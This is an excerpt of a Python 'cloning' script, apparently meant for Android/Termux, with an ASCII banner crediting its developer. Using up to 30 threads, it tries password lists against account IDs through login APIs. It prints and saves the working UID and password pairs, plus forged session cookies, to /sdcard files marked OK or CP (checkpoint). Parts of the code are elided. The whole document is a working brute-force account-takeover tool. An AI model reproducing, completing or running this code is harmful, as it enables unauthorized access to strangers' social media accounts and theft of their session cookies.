...
/____/\__,_/_/ /_/\__,_/_/ .___/\___/\__, /  
                        /_/         /____/
{A}--------------------------------------------------
{R}[{X}={R}]{A} DEVELOPER  {GOD}<>  {A} SANDIPEYY
...
def Main_Sandipeyy():
        ...
        if opt1 == "1": file()   
            ...
            if opt == '2':ind()
            if opt== '3':gmail()
            else:linex();print(f'{R}[{X}!{R}]{A} SELECTED WRONG OPTION ');time.sleep(2);Main_Sandipeyy()
            if d == '0':Main_Sandipeyy()
            else:linex();print(f'{R}[{X}!{R}]{A} SELECTED WRONG OPTION ');time.sleep(2);Main_Sandipeyy()
...
def file():
    ...
    with tred(max_workers=30) as Sandipeyy:
        ...
        for user in fo:
            ...
            passlist = plist
            if methd =='1':
                Sandipeyy.submit(api1,ids,names,passlist)
            elif methd =='2':
                Sandipeyy.submit(api2,ids,names,passlist)
            else:
                Sandipeyy.submit(api1,ids,names,passlist)
    ...
    print(f"{R}[{X}✓{R}]{A} CLONING ACCOUNTS SAVED IN /sdcard/Sandipeyy.txt")
    print(f'\r{A}--------------------------------------------------')
...
def bd():
                ...
                with tred(max_workers=30) as Sandipeyy:     
                        ...
                        for psx in user:
                                ...
                                Sandipeyy.submit(rd1,ids,passlist)
                print(f'\r{A}--------------------------------------------------')
                print(f"{R}[{X}✓{R}]{A} CLONING HAS BEEN COMPLETED ")
                print(f'{R}[{X}✓{R}]{A} TOTAL OK IDs {R}<{C}/{R}>{X} '+str(len(oks)))
                print(f"{R}[{X}✓{R}]{A} CLONING ACCOUNTS SAVED IN /sdcard/Sandipeyy.txt")
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write(f'\r{R}[{X}Sandipeyy{R}]{A}={R}[{X}%s{R}]{A}={R}[{X}OK{R}]{A}={R}[{X}%s{R}] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        status= lock(uid)
                        if "Active" in status:
                        	print(f'\r{R}[{X}Sandipeyy-ok{R}]{X} '+uid+f' {R}|{X} '+pas)
                        print(f"\r{R}[{X}Cookie{R}] {R}<{C}/{R}>{A} {cookie}")
                        file_path_ok = os.path.join(folder_path, 'Sandipeyy-RANDOM-OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'Sandipeyy-RANDOM-COOKIE.txt')
                        ...
                        print(f'\r{R}[{Y}Sandipeyy-cp{R}]{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                        file_path = os.path.join(folder_path, 'Sandipeyy-RANDOM-CP.txt')
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    print(f'\r{R}[{X}Sandipeyy-ok{R}]{X} '+uid+f' {R}|{X} '+pas)
                    print(f"\r{R}[{X}Cookie{R}]{R} <{C}/{R}>{A} {cookie}")
                    file_path = os.path.join(folder_path, 'Sandipeyy_FILE_M1_OK.txt')
                    open('/sdcard/Sandipeyy/Sandipeyy_FILE_M1_OK_COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}[{Y}Sandipeyy-cp{R}]{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'Sandipeyy_FILE_M1_CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}[{X}Sandipeyy-ok{R}] '+uid+f' {R}|{X} '+pas)
                    print(f"\r{R}[{X}Cookie{R}]{R} <{C}/{R}>{X} {cookie}")
                    file_path = os.path.join(folder_path, 'Sandipeyy_FILE_M2_OK.txt')
                    open('/sdcard/Sandipeyy/Sandipeyy_FILE_M2_OK_COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}[{Y}Sandipeyy-cp{R}]{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'Sandipeyy_FILE_M2_CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
